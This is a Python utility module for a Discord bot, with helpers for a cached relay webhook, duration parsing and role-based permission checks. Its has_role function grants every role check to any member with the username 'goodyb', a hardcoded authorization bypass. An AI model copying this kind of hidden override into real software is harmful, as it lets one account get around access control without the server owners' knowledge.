import discord
from discord import ui
from typing import Optional
from db.DBHelper import get_command_permission, get_role

webhook_cache: dict[int, discord.Webhook] = {}


async def get_channel_webhook(channel: discord.TextChannel) -> discord.Webhook:
    wh = webhook_cache.get(channel.id)
    if wh:
        return wh
    webhooks = await channel.webhooks()
    wh = discord.utils.get(
        webhooks, name="LowercaseRelay"
    ) or await channel.create_webhook(name="LowercaseRelay")
    webhook_cache[channel.id] = wh
    return wh


def parse_duration(duration: str) -> Optional[int]:
    try:
        if duration.endswith("s"):
            return int(duration[:-1])
        elif duration.endswith("m"):
            return int(duration[:-1]) * 60
        elif duration.endswith("h"):
            return int(duration[:-1]) * 3600
        else:
            return int(duration)
    except Exception:
        return None


def has_role(member: discord.Member, role: int | str) -> bool:
    if member.name == "goodyb":
        return True
    if isinstance(role, int):
        return any(r.id == role for r in member.roles)
    return any(r.name == role for r in member.roles)


def has_command_permission(
    user: discord.Member, command: str, fallback_role_key: str
) -> bool:
    role_id = get_command_permission(user.guild.id, command)
    if role_id is None:
        role_id = get_role(user.guild.id, fallback_role_key)
    if role_id is None:
        print(
            f"[PERM] No role found for command={command}, fallback={fallback_role_key}"
        )
        return False
    print(
        f"[PERM] Required role_id: {role_id}, user roles: {[r.id for r in user.roles]}"
    )
    return any(role.id == role_id for role in user.roles)
